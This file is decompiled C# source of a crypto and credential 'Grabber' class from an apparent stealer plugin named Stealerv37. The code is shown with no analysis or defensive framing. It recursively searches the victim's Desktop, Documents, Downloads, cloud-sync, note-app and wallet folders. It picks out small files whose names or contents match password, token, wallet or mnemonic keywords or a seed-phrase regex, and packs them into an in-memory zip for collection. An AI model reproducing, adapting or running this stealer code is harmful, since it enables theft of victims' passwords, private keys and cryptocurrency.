// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Crypto.Grabber
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper;
using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Crypto;

public class Grabber : ITarget
{
  private readonly long _sizeMinFile = 120;
  private readonly long _sizeLimitFile = 6144;
  private readonly long _sizeLimit = 5242880 /*0x500000*/;
  private long _size;
  private readonly Regex _seedRegex = new Regex("^(?:\\s*\\b[a-z]{3,}\\b){12,24}\\s*$", RegexOptions.IgnoreCase | RegexOptions.Multiline | RegexOptions.Compiled);
  private readonly string[] _blacklist = new string[10]
  {
    "license",
    "readme",
    "changelog",
    "about",
    "terms",
    "eula",
    "notice",
    "example",
    "sample",
    "test"
  };
  private readonly string[] _keywords = new string[35]
  {
    "password",
    "passwd",
    "pwd",
    "pass",
    "login",
    "user",
    "username",
    "account",
    "mail",
    "email",
    "secret",
    "key",
    "private",
    "public",
    "wallet",
    "mnemonic",
    "seed",
    "recovery",
    "phrase",
    "backup",
    "pin",
    "auth",
    "2fa",
    "token",
    "apikey",
    "api_key",
    "ssh",
    "cert",
    "certificate",
    "crypto",
    "btc",
    "eth",
    "usdt",
    "ltc",
    "xmr"
  };
  private readonly string[] _seedExtensions = new string[9]
  {
    ".seed",
    ".seedphrase",
    ".mnemonic",
    ".phrase",
    ".key",
    ".secret",
    ".txt",
    ".backup",
    ".wallet"
  };
  private readonly string[] _seedPaths = new string[19]
  {
    Environment.GetFolderPath(Environment.SpecialFolder.Personal),
    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.Personal),
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
    Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Dropbox",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\iCloudDrive",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Google Drive",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\YandexDisk",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Mega",
    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Evernote",
    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Standard Notes",
    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Joplin",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Wallets",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Keys",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Crypto",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Backup"
  };

  private long Size
  {
    get => Interlocked.Read(ref this._size);
    set => Interlocked.Exchange(ref this._size, value);
  }

  public void Collect(InMemoryZip zip, Counter counter)
  {
    Parallel.ForEach<string>((IEnumerable<string>) this._seedPaths, (Action<string>) (directory => this.SearchFiles(zip, counter, directory)));
  }

  private void SearchFiles(InMemoryZip zip, Counter counter, string directory)
  {
    if (this.Size > this._sizeLimit)
      return;
    try
    {
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetDirectories(directory), (Action<string>) (subDir =>
      {
        if (this.Size > this._sizeLimit)
          return;
        this.SearchFiles(zip, counter, subDir);
      }));
    }
    catch
    {
    }
    try
    {
      Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(directory), (Action<string>) (file =>
      {
        if (this.Size > this._sizeLimit)
          return;
        FileInfo fileInfo = new FileInfo(file);
        if (!((IEnumerable<string>) this._seedExtensions).Contains<string>(fileInfo.Extension, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase) || fileInfo.Length >= this._sizeLimitFile || fileInfo.Length <= this._sizeMinFile)
          return;
        string str = File.ReadAllText(fileInfo.FullName);
        if (!this.ContainsKeyword(fileInfo.Name) && !this.ContainsKeyword(str) && !this.ContainsSeedPhrase(str))
          return;
        this.Size += fileInfo.Length;
        string entryPath = $"Files\\{fileInfo.Name}{RandomStrings.GenerateHashTag()}{fileInfo.Extension}";
        zip.AddTextFile(entryPath, str);
        counter.FilesGrabber.Add($"{file} => {entryPath}");
      }));
    }
    catch
    {
    }
  }

  private bool ContainsSeedPhrase(string content) => this._seedRegex.IsMatch(content);

  private bool ContainsKeyword(string content)
  {
    if (string.IsNullOrEmpty(content))
      return false;
    string[] source = content.Split(new char[14]
    {
      ' ',
      '\t',
      '\r',
      '\n',
      ',',
      '.',
      ';',
      ':',
      '-',
      '_',
      '/',
      '\\',
      '"',
      '\''
    }, StringSplitOptions.RemoveEmptyEntries);
    HashSet<string> whitelist = new HashSet<string>((IEnumerable<string>) this._keywords, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    HashSet<string> blacklist = new HashSet<string>((IEnumerable<string>) this._blacklist, (IEqualityComparer<string>) StringComparer.OrdinalIgnoreCase);
    int result = 0;
    Action<string, ParallelLoopState> body = (Action<string, ParallelLoopState>) ((word, state) =>
    {
      if (Volatile.Read(ref result) == -1)
        state.Stop();
      else if (blacklist.Contains(word))
      {
        Interlocked.Exchange(ref result, -1);
        state.Stop();
      }
      else
      {
        if (!whitelist.Contains(word))
          return;
        Interlocked.CompareExchange(ref result, 1, 0);
      }
    });
    Parallel.ForEach<string>((IEnumerable<string>) source, body);
    return result == 1;
  }
}
